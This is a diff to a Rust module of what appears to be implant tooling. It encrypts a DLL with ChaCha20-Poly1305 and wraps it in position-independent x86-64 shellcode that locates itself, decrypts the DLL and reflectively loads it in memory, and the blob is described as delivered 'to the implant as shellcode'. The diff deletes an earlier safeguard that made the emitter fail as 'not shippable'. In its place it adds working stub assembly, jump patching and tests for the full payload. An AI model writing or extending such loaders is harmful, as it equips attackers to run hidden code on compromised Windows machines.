@@ -13,46 +13,52 @@
 //! dll_bytes ──► wrap_payload() ──► blob ──► implant receives blob
 //!                 │                              │
 //!                 ├─ encrypt DLL (ChaCha20-Poly1305)      │
-//!                 ├─ prepend loader stub (when Layer 2    ▼
-//!                 │    exists)                     execute stub
-//!                 └─ append NYX2 header                  │
-//!                                                         ▼
+//!                 ├─ prepend loader stub                   ▼
+//!                 └─ append LAYER2 (pic-loader)    execute stub
+//!                                                         │
 //!                                                    stub self-locates
 //!                                                    finds NYX2 magic
 //!                                                    reads len + nonce
+//!                                                    jmp → LAYER2:
 //!                                                    decrypts (inline
 //!                                                     ChaCha20-Poly1305)
 //!                                                    reflectively loads PE
 //!                                                    calls DllMain
 //! ```
 //!
-//! **STATUS: the loader is NOT shippable yet.** The on-target Layer-2
-//! shellcode (decrypt + reflective load) does not exist, so
-//! [`generate_loader_stub`] and [`wrap_payload`] fail loudly with
-//! [`LoaderError::Layer2Unavailable`] and no blob is emitted. The diagram
-//! below is the intended end-state once a real Layer-2 lands (spec §5.3).
-//!
-//! ## Payload layout
+//! ## Payload layout (definitive, spec §5.3)
 //!
 //! ```text
 //! ┌──────────────┬──────────────┬──────────────┬──────────────┬──────────────┐
-//! │  loader stub │  NYX2 magic  │ encrypted_len│    nonce     │  ciphertext  │
-//! │  (variable)  │   (4 bytes)  │  u32 LE (4B) │   (12 bytes) │  (N bytes)   │
-//! └──────────────┴──────────────┴──────────────┴──────────────┴──────────────┘
-//!                                                              │
-//!                                                ┌──────────────┴──────────────┐
-//!                                                │  Poly1305 tag (16 bytes)    │
-//!                                                └─────────────────────────────┘
+//! │  LAYER1 +    │   key (32B)  │  NYX2 magic  │ encrypted_len│   ciphertext │
+//! │  bridge      │              │   (4 bytes)  │  u32 LE (4B) │  (N bytes)   │
+//! ├──────────────┴──────────────┴──────────────┴──────────────┴──────────────┤
+//! │  nonce (12B) │            ciphertext        │  Poly1305 tag (16B)        │
+//! └──────────────┴──────────────────────────────┴────────────────────────────┘
+//! ────────────────────────────► then LAYER2 code (pic-loader) ◄──────────────
 //! ```
 //!
-//! The loader stub length is `LAYER1_BOOTSTRAP.len() + 32 (key) + <Layer 2>`
-//! — see [`on_target`] for the Layer-1 byte counts. **Layer 2 is not
-//! implemented**, so [`generate_loader_stub`] and [`wrap_payload`] currently
-//! fail with [`LoaderError::Layer2Unavailable`]; no blob can be emitted until
-//! a real Layer-2 exists. Once it does, total payload size:
-//! `stub_len + 4 + 4 + 12 + N + 16 = stub_len + 36 + N` bytes where
-//! N = `dll_bytes.len()` (ChaCha20-Poly1305 ciphertext is same length as
-//! plaintext).
+//! The full blob is `[LAYER1 + bridge][key 32B][header][ct||tag][LAYER2]`:
+//!
+//!   * **LAYER1 + bridge** — [`on_target::LAYER1_BOOTSTRAP`]: self-location,
+//!     bounded NYX2 magic scan, header parse, and the bridge that sets the
+//!     pic-loader Win64 entry ABI (`rcx=&key, rdx=&nonce, r8=&ct, r9=ct_len`),
+//!     ending in a `jmp rel32` that [`wrap_payload`] patches to the Layer-2
+//!     entry.
+//!   * **key** — the 32-byte ChaCha20 key, baked in at
+//!     [`on_target::KEY_PATCH_OFFSET`] (the bridge derives `&key` as
+//!     `header_base - 0x20`).
+//!   * **header** — NYX2 magic (4B) + encrypted_len u32 LE (4B) + nonce (12B).
+//!     Sits right after LAYER1+bridge+key (~0x68) so the 256-byte scan always
+//!     finds it.
+//!   * **ct||tag** — ciphertext (N bytes, same length as the DLL) + 16-byte
+//!     Poly1305 tag.
+//!   * **LAYER2** — [`on_target::LAYER2_CODE`], the raw pic-loader bytes,
+//!     appended AFTER the ciphertext so the header stays within the scan
+//!     bound. The Layer-1 `jmp` is what reaches it.
+//!
+//! Total payload size: `LAYER1_BOOTSTRAP.len() + 32 + 20 + N + 16 +
+//! LAYER2_CODE.len()` bytes.
 
 pub mod dll_probe;
 pub mod on_target;
@@ -66,6 +72,10 @@ use chacha20poly1305::{
 use rand::RngCore;
 
 // Re-export key constants for callers that need to reason about offsets.
+pub use on_target::{
+    KEY_LEN, KEY_PATCH_OFFSET, LAYER1_BOOTSTRAP, LAYER2_CODE, LAYER2_ENTRY_OFFSET,
+    LAYER2_JMP_OFFSET,
+};
 pub use stub::{
     reflective_load, reflective_load_at, ImportResolver, MappedImage, ReflectiveLoadError,
     CIPHERTEXT_OFFSET, ENCRYPTED_LEN_OFFSET, NONCE_OFFSET, NYX2_MAGIC, PIC_STUB_LEN, TAG_LEN,
@@ -110,32 +120,27 @@ impl LoaderConfig {
 // ── Public API ──────────────────────────────────────────────────────────
 
 /// Errors produced by the loader-stub emitter.
-///
-/// The only variant today is [`LoaderError::Layer2Unavailable`]: the
-/// on-target Layer-2 shellcode (decrypt + reflective PE load) does not exist,
-/// so the loader capability is deliberately not shippable. When a real
-/// Layer-2 lands (spec §5.3), validation errors such as a key containing the
-/// NYX2 magic can be added here.
 #[derive(Clone, Debug, PartialEq, Eq)]
 pub enum LoaderError {
-    /// The Layer-2 on-target shellcode (PEB walk, RWX alloc, inline
-    /// ChaCha20-Poly1305 decrypt, reflective PE load, `DllMain` call) is not
-    /// implemented. The previous `LAYER2_PEB_WALK` bytes were a non-functional
-    /// placeholder and were deleted; emitting a stub without them would ship a
-    /// blob that cannot decrypt or load the DLL. No loader payload can be
-    /// produced until a real, execution-validated Layer-2 exists.
-    Layer2Unavailable,
+    /// The 32-byte ChaCha20 key would make the Layer-1 scan self-match. The
+    /// scan cursor starts inside the stub and walks forward over
+    /// `LAYER1 + key` before reaching the real header; a magic window
+    /// anywhere in the emitted stub (only the key can contribute one —
+    /// `LAYER1_BOOTSTRAP` is pinned by test and its zero trailing bytes
+    /// cannot complete a window with the key's first bytes) makes the
+    /// scanner stop early and parse garbage as the header. Probability
+    /// ~2^-29 for a random key; regenerate the key.
+    KeyContainsMagic,
 }
 
 impl core::fmt::Display for LoaderError {
     fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
         match self {
-            Self::Layer2Unavailable => write!(
+            Self::KeyContainsMagic => write!(
                 f,
-                "loader stub emission unavailable: the on-target Layer-2 shellcode \
-                 (PEB walk + RWX alloc + inline ChaCha20-Poly1305 decrypt + reflective \
-                 PE load + DllMain) is not implemented; the loader capability is not \
-                 shippable until a real Layer-2 exists (spec §5.3)"
+                "the 32-byte ChaCha20 key contains the NYX2 magic (0x3258594E) as a \
+                 contiguous 4-byte window; the Layer-1 scan would self-match inside the \
+                 key slot and parse garbage as the NYX2 header — regenerate the key"
             ),
         }
     }
@@ -145,50 +150,68 @@ impl std::error::Error for LoaderError {}
 
 /// Emit the raw position-independent x86-64 loader stub for `config`.
 ///
-/// # Status: NOT SHIPPABLE
+/// The returned stub is the fixed per-config prefix of the full NYX2 blob:
 ///
-/// This function **always** returns [`LoaderError::Layer2Unavailable`]. The
-/// on-target Layer-2 shellcode does not exist — the previous `LAYER2_PEB_WALK`
-/// byte blob was a non-functional placeholder (fabricated offsets, placeholder
-/// operands) and has been deleted. Emitting a stub without real Layer-2 bytes
-/// would produce a blob that cannot decrypt or reflectively load anything, so
-/// this function fails loudly instead of emitting a broken fragment.
+/// ```text
+/// [LAYER1 + bridge (self-locate + scan + header parse + Win64 ABI bridge
+///                   + jmp rel32 placeholder)][key 32B]
+/// ```
 ///
-/// ## When this will work
+/// Layer 1 is [`on_target::LAYER1_BOOTSTRAP`] verbatim; the 32-byte
+/// `config.key` is baked in at [`on_target::KEY_PATCH_OFFSET`]
+/// (= `LAYER1_BOOTSTRAP.len()`), where the bridge's `lea rcx, [rbx-0x20]`
+/// expects it. The 12-byte `config.nonce` is NOT baked in here — it travels
+/// in the NYX2 header that [`wrap_payload`] appends, so the same stub can be
+/// re-used with different nonces.
 ///
-/// Once a real Layer-2 exists (spec §5.3, execution-validated by the VPS
-/// loader probe, spec §5.5), this returns the full on-target shellcode:
-/// Layer 1 (self-location, NYX2 magic scan, header parse) immediately
-/// followed by Layer 2 (PEB walk, RWX alloc, inline ChaCha20-Poly1305,
-/// reflective PE load, `DllMain` call). The 32-byte `config.key` is baked in
-/// at [`on_target::KEY_PATCH_OFFSET`]; the 12-byte `config.nonce` is NOT
-/// baked in here — it travels in the NYX2 header that [`wrap_payload`]
-/// appends, so the same stub can be re-used with different nonces. The
-/// `jmp rel32` at [`on_target::LAYER2_JMP_OFFSET`] is patched to land at the
-/// first byte of Layer 2 (= `KEY_PATCH_OFFSET + KEY_LEN`).
+/// The `jmp rel32` at [`on_target::LAYER2_JMP_OFFSET`] is left with its
+/// zero placeholder here: Layer 2 ([`on_target::LAYER2_CODE`]) sits AFTER the
+/// ciphertext in the wrapped payload, so its displacement depends on the DLL
+/// length and is patched by [`wrap_payload`].
+///
+/// # Errors
+///
+/// Returns [`LoaderError::KeyContainsMagic`] if `config.key` would make the
+/// Layer-1 scanner self-match (see the variant docs).
 pub fn generate_loader_stub(config: &LoaderConfig) -> Result<Vec<u8>, LoaderError> {
-    // Fail loudly: the loader capability is not shippable until a real
-    // Layer-2 exists. Do NOT emit the Layer-1 prefix + key + placeholder
-    // fragment — that would look like a working loader and fail on-target.
-    let _ = config;
-    Err(LoaderError::Layer2Unavailable)
+    let mut stub = Vec::with_capacity(LAYER1_BOOTSTRAP.len() + KEY_LEN);
+    stub.extend_from_slice(LAYER1_BOOTSTRAP);
+    stub.extend_from_slice(&config.key);
+
+    // The scan cursor starts at offset 5 inside the stub and walks forward
+    // over LAYER1 + key looking for the magic. LAYER1 is pinned by test to
+    // have no magic window, so the only caller-controlled risk is the key;
+    // check the emitted stub anyway so a future LAYER1 edit cannot silently
+    // reintroduce a self-match. A magic window before the real header would
+    // make the scanner parse garbage as the header (silent decrypt failure).
+    if stub
+        .windows(4)
+        .any(|w| u32::from_le_bytes([w[0], w[1], w[2], w[3]]) == NYX2_MAGIC)
+    {
+        return Err(LoaderError::KeyContainsMagic);
+    }
+
+    Ok(stub)
 }
 
 /// Encrypt a DLL, prepend the loader stub, and assemble the full NYX2 payload.
 ///
-/// # Layout
+/// # Layout (definitive, spec §5.3)
 ///
 /// ```text
-/// [loader stub (variable, key baked in)][NYX2 magic (4B)]
-/// [encrypted_len u32 LE (4B)][nonce (12B)]
-/// [ciphertext (dll_bytes.len() bytes)][Poly1305 tag (16B)]
+/// [LAYER1 + bridge][key 32B][NYX2 magic (4B)][encrypted_len u32 LE (4B)]
+/// [nonce (12B)][ciphertext (N bytes)][Poly1305 tag (16B)][LAYER2 code]
 /// ```
 ///
-/// The loader stub is the per-config output of [`generate_loader_stub`] —
-/// Layer 1 + Layer 2 with `config.key` baked in. `config.nonce` is carried in
-/// the NYX2 header (so the same stub template can be re-used with different
-/// nonces); the inline ChaCha20-Poly1305 routine reads it from there at
+/// The stub is the per-config output of [`generate_loader_stub`] — Layer 1 +
+/// bridge with `config.key` baked in. `config.nonce` is carried in the NYX2
+/// header (so the same stub template can be re-used with different nonces);
+/// the inline ChaCha20-Poly1305 routine in Layer 2 reads it from there at
 /// runtime.
+///
+/// Layer 2 ([`on_target::LAYER2_CODE`]) is appended AFTER the ciphertext so
+/// the header stays within the Layer-1 256-byte scan bound; the `jmp rel32`
+/// inside Layer 1 is patched to land on `LAYER2_CODE + LAYER2_ENTRY_OFFSET`.
 ///
 /// # Arguments
 ///
@@ -200,20 +223,19 @@ pub fn generate_loader_stub(config: &LoaderConfig) -> Result<Vec<u8>, LoaderErro
 ///
 /// # Returns
 ///
-/// **Currently always fails** with [`LoaderError::Layer2Unavailable`]: the
-/// on-target Layer-2 shellcode does not exist, so no blob can be emitted (see
-/// [`generate_loader_stub`]). Once Layer-2 lands, returns a `Vec<u8>`
-/// containing the complete payload blob, ready to be delivered to the implant
-/// as shellcode.
+/// The complete payload blob, ready to be delivered to the implant as
+/// shellcode: `[LAYER1 + bridge][key][header][ct||tag][LAYER2]`. The only
+/// error is [`LoaderError::KeyContainsMagic`] (propagated from
+/// [`generate_loader_stub`]).
 pub fn wrap_payload(dll_bytes: &[u8], config: &LoaderConfig) -> Result<Vec<u8>, LoaderError> {
-    // 0. The stub gates the whole payload. Without a working Layer-2 the blob
-    //    is unusable on-target, so fail before encrypting anything.
-    let stub = generate_loader_stub(config)?;
+    // 0. Emit the stub (LAYER1 + bridge + key slot). The Layer-2 jmp
+    //    displacement is patched below once the ciphertext length is known.
+    let mut stub = generate_loader_stub(config)?;
 
     // 1. Encrypt the DLL with ChaCha20-Poly1305. The on-target inline decrypt
     //    routine uses the SAME (key, nonce) — key from the stub, nonce from
     //    the NYX2 header — so the ciphertext this produces is exactly what
-    //    the stub will turn back into the plaintext PE.
+    //    Layer 2 will turn back into the plaintext PE.
     let cipher = ChaCha20Poly1305::new_from_slice(&config.key)
         .expect("ChaCha20Poly1305 key is always 32 bytes");
     let nonce = Nonce::from_slice(&config.nonce);
@@ -225,8 +247,18 @@ pub fn wrap_payload(dll_bytes: &[u8], config: &LoaderConfig) -> Result<Vec<u8>, 
     // encrypted_len = dll_bytes.len() (ciphertext portion, excluding tag)
     let encrypted_len = dll_bytes.len() as u32;
 
-    // 2. Assemble: stub + NYX2 header + ciphertext (includes tag)
-    let mut payload = Vec::with_capacity(stub.len() + 4 + 4 + 12 + ciphertext.len());
+    // 2. Patch the Layer-1 jmp to land on the Layer-2 entry. LAYER2 sits
+    //    right after ct||tag, so its absolute offset depends on the DLL
+    //    length — only known here, not in generate_loader_stub.
+    let layer2_start = stub.len() + CIPHERTEXT_OFFSET + ciphertext.len();
+    let jmp_end = LAYER2_JMP_OFFSET + 5; // jmp rel32 is the last instruction of LAYER1
+    let jmp_target = layer2_start + LAYER2_ENTRY_OFFSET;
+    let disp =
+        i32::try_from(jmp_target - jmp_end).expect("payload is far below the 2 GiB rel32 limit");
+    stub[LAYER2_JMP_OFFSET + 1..LAYER2_JMP_OFFSET + 5].copy_from_slice(&disp.to_le_bytes());
+
+    // 3. Assemble: stub + NYX2 header + ciphertext (incl. tag) + LAYER2.
+    let mut payload = Vec::with_capacity(layer2_start + LAYER2_CODE.len());
     payload.extend_from_slice(&stub);
 
     // NYX2 magic (4 bytes, little-endian)
@@ -240,6 +272,9 @@ pub fn wrap_payload(dll_bytes: &[u8], config: &LoaderConfig) -> Result<Vec<u8>, 
 
     // ciphertext || Poly1305 tag
     payload.extend_from_slice(&ciphertext);
+
+    // Layer 2 (pic-loader PIC shellcode)
+    payload.extend_from_slice(LAYER2_CODE);
 
     Ok(payload)
 }
@@ -267,35 +302,57 @@ mod tests {
         dll
     }
 
-    /// The loader capability is NOT shippable: `generate_loader_stub` must
-    /// fail loudly (return Err) instead of emitting a stub fragment, because
-    /// no real Layer-2 on-target shellcode exists. This is the headline
-    /// contract of the current loader status — a silent success here would
-    /// ship a blob that cannot decrypt or load anything on-target.
+    /// `generate_loader_stub` emits the definitive stub: `LAYER1_BOOTSTRAP`
+    /// verbatim followed by the 32-byte key slot at [`KEY_PATCH_OFFSET`].
     #[test]
-    fn generate_loader_stub_fails_loudly_without_layer2() {
-        let config = LoaderConfig::random();
-        let err = generate_loader_stub(&config)
-            .expect_err("generate_loader_stub must fail: Layer-2 shellcode is not implemented");
-        assert_eq!(err, LoaderError::Layer2Unavailable);
-        // The error message must be actionable, not a bare enum name.
+    fn generate_loader_stub_emits_layer1_plus_key() {
+        let key = [0x42u8; 32];
+        let nonce = [0x33u8; 12];
+        let config = LoaderConfig::new(key, nonce);
+        let stub = generate_loader_stub(&config).expect("stub emission must succeed");
+        assert_eq!(
+            &stub[..LAYER1_BOOTSTRAP.len()],
+            LAYER1_BOOTSTRAP,
+            "stub must start with LAYER1_BOOTSTRAP verbatim"
+        );
+        assert_eq!(KEY_PATCH_OFFSET, LAYER1_BOOTSTRAP.len());
+        assert_eq!(
+            &stub[KEY_PATCH_OFFSET..KEY_PATCH_OFFSET + KEY_LEN],
+            &key[..],
+            "the 32-byte key must be baked in at KEY_PATCH_OFFSET"
+        );
+        assert_eq!(stub.len(), LAYER1_BOOTSTRAP.len() + KEY_LEN);
+    }
+
+    /// A key whose bytes spell the NYX2 magic as a contiguous window must be
+    /// rejected: the Layer-1 scan would self-match inside the key slot and
+    /// parse garbage as the header.
+    #[test]
+    fn generate_loader_stub_rejects_key_containing_magic() {
+        let mut key = [0x11u8; 32];
+        key[8..12].copy_from_slice(&NYX2_MAGIC.to_le_bytes());
+        let config = LoaderConfig::new(key, [0x22u8; 12]);
+        let err = generate_loader_stub(&config).expect_err("magic-bearing key must be rejected");
+        assert_eq!(err, LoaderError::KeyContainsMagic);
         let msg = err.to_string();
         assert!(
-            msg.to_lowercase().contains("layer-2"),
-            "error must explain the Layer-2 gap, got: {msg}"
+            msg.to_lowercase().contains("key") && msg.contains("0x3258594E"),
+            "error must explain the key/magic clash, got: {msg}"
         );
     }
 
-    /// `wrap_payload` must propagate the stub failure — no blob may be
-    /// emitted while the loader cannot actually load.
+    /// `wrap_payload` emits the full definitive blob and propagates stub
+    /// errors (the magic-bearing key is caught before any encryption).
     #[test]
-    fn wrap_payload_fails_loudly_without_layer2() {
-        let config = LoaderConfig::random();
+    fn wrap_payload_propagates_key_validation_error() {
+        let mut key = [0x01u8; 32];
+        key[0..4].copy_from_slice(&NYX2_MAGIC.to_le_bytes());
+        let config = LoaderConfig::new(key, [0x02u8; 12]);
         let dll = dummy_dll();
-        let err = wrap_payload(&dll, &config).expect_err(
-            "wrap_payload must fail: it cannot emit a payload without a working loader stub",
+        assert_eq!(
+            wrap_payload(&dll, &config),
+            Err(LoaderError::KeyContainsMagic)
         );
-        assert_eq!(err, LoaderError::Layer2Unavailable);
     }
 
     /// `LoaderError` must be usable through the `std::error::Error` trait
@@ -303,8 +360,8 @@ mod tests {
     #[test]
     fn loader_error_implements_std_error() {
         fn takes_error<E: std::error::Error>(_e: &E) {}
-        takes_error(&LoaderError::Layer2Unavailable);
-        let _ = format!("{}", LoaderError::Layer2Unavailable);
+        takes_error(&LoaderError::KeyContainsMagic);
+        let _ = format!("{}", LoaderError::KeyContainsMagic);
     }
 
     #[test]
@@ -316,7 +373,7 @@ mod tests {
     }
 
     /// `LoaderConfig::new` preserves the key/nonce verbatim (the emitter
-    /// contract a future Layer-2 relies on).
+    /// contract the pic-loader Layer-2 relies on).
     #[test]
     fn loader_config_new_preserves_key_and_nonce() {
         let key = [0xAAu8; 32];
